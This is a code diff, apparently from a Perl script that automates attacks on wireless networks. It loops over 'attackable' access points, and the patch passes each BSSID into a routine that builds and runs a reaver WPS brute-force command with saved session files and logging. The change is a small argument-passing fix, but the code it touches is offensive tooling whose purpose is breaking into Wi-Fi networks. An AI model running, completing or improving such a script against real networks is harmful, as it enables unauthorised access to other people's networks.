@@ -235,9 +235,8 @@ die;
 
 #attack the hackable networks
 foreach $current_bssid ( @attackable ){
-	attack_hackable();
+	attack_hackable($current_bssid);
 }
-
 
 
 print "\n\n\n::::: fin :::::\n\n\n";
@@ -495,12 +494,13 @@ sub attack_hackable {
 	$washline="";
 	$ap_rate_limit="0";
         $beaconwait="0";
-
+	
+	$current_bssid=$_[0];
 	if ($current_bssid =~ /([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2}):([0-9a-f]{2})/i) {
                 $bssid_without_colon="$1$2$3$4$5$6";
-        }
+        
+	}
         $cmd="reaver -v -i $mondev -b $current_bssid -a -s /usr/local/etc/reaver/$bssid_without_colon.wpc > $logfile 2>&1 ";
-
 	print "\n::::: ==================================================================================================================";
 	print "\n:::::  Attacking";
 	print "\n::::: ==================================================================================================================";
